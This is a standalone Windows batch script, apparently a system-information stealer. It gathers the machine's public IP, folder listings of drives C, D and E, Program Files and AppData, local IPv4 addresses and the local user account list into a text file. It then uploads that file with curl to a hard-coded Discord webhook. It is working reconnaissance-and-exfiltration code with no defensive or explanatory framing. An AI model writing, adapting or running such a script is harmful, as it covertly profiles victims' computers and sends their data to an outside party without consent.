@echo off



set "output_file=output.txt"	
set "url=https://www.myexternalip.com/raw"


set CURRENT_USER=%USERNAME%
echo Username: %CURRENT_USER% >> "%output_file%"

timeout /t 1 >nul

curl -o "%output_file%" "%url%"


echo. >> "%output_file%"
echo ================ABOVE= IP =ABOVE================ >> "%output_file%"
echo. >> "%output_file%"

echo. >> "%output_file%"
echo ==================== Disk C ==================== >> "%output_file%"
echo. >> "%output_file%"

dir "C:\" /b /ad >> "%output_file%"

echo. >> "%output_file%"
echo ==================== Disk D ==================== >> "%output_file%"
echo. >> "%output_file%"

dir "D:" /b /ad >> "%output_file%"

echo. >> "%output_file%"
echo ==================== Disk E ==================== >> "%output_file%"
echo. >> "%output_file%"

dir "E:" /b /ad >> "%output_file%"

echo. >> "%output_file%"
echo ==================== Program Files ==================== >> "%output_file%"
echo. >> "%output_file%"

dir "C:\Program Files" /b /ad >> "%output_file%"

echo. >> "%output_file%"
echo ==================== Program Files x86 ==================== >> "%output_file%"
echo. >> "%output_file%"

dir "C:\Program Files (x86)" /b /ad >> "%output_file%"

echo. >> "%output_file%"
echo ==================== Local ==================== >> "%output_file%"
echo. >> "%output_file%"

dir "%LOCALAPPDATA%" /b /ad >> "%output_file%"

echo. >> "%output_file%"
echo ==================== Appdata ==================== >> "%output_file%"
echo. >> "%output_file%"

dir "%APPDATA%" /b /ad >> "%output_file%"

echo. >> "%output_file%"
echo ==================== IPv4 --- Not real ==================== >> "%output_file%"
echo. >> "%output_file%"

set "IPv4_file=output.txt"
ipconfig | findstr /i "IPv4 Address" >> "%IPv4_file%"


echo. >> "%output_file%"
echo ==================== USERS ==================== >> "%output_file%"
echo. >> "%output_file%"

set "Users_file=output.txt"
net user >> "%Users_file%"


timeout /t 2 >nul

set WEBHOOK_URL=https://discord.com/api/webhooks/1115008667113238548/3tOV92OktoESH6tCiY0OnPFjlk6ZRdjLxVpf3gbzkyZw4GfeISM0sx6w2x2yfGwPpeqw
set FILE_PATH=output.txt

curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%FILE_PATH%" %WEBHOOK_URL%
